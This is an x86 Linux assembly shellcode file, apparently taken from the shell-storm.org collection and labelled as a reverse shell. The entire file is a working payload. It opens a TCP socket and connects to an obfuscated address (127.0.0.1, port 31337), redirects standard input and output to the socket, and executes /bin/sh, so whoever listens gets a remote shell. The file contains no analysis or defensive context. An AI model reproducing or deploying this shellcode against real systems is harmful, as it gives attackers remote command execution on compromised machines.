; http://shell-storm.org/shellcode/files/shellcode-849.php
; Reverse shell

section .text

	global _start

_start:

	xor eax,eax
	mov al,0x66
	xor ebx,ebx
	add bl,0x1
	xor ecx,ecx
	mov edx,ecx
	push edx
	add dl, 0x6
	push edx
	sub dl, 0x6
	push ebx
	push 0x2
	mov ecx,esp
	int 0x80


	push eax
	pop esi
	mov al,0x66
	mov ebx,edx
	add bl,0x2
	xor edi, edi
	mov edi, 0x12111190
	sub edi, 0x11111111
	push edi
	push word 0x697a
	push bx
	add bl, 1
	mov ecx,esp
	push 0x10
	push ecx 
	push esi 
	mov ecx,esp
	int 0x80
	
	cld
	mov ecx, edx
	mov cl,0x3

test:
	mov al,0x3f
	dec cl
	int 0x80
	jne test

	mov edi, 0x69622f2f
	mov eax,edx
	mov esi, edx
	push esi
	mov esi,0x68732f6e
	push esi
	push edi
	mov ebx,esp
	push eax 
	push ebx 
	mov ecx,esp
	push edx 
	mov al,0xe0
	mov edx,esp
	mov al,0xb
	int 0x80
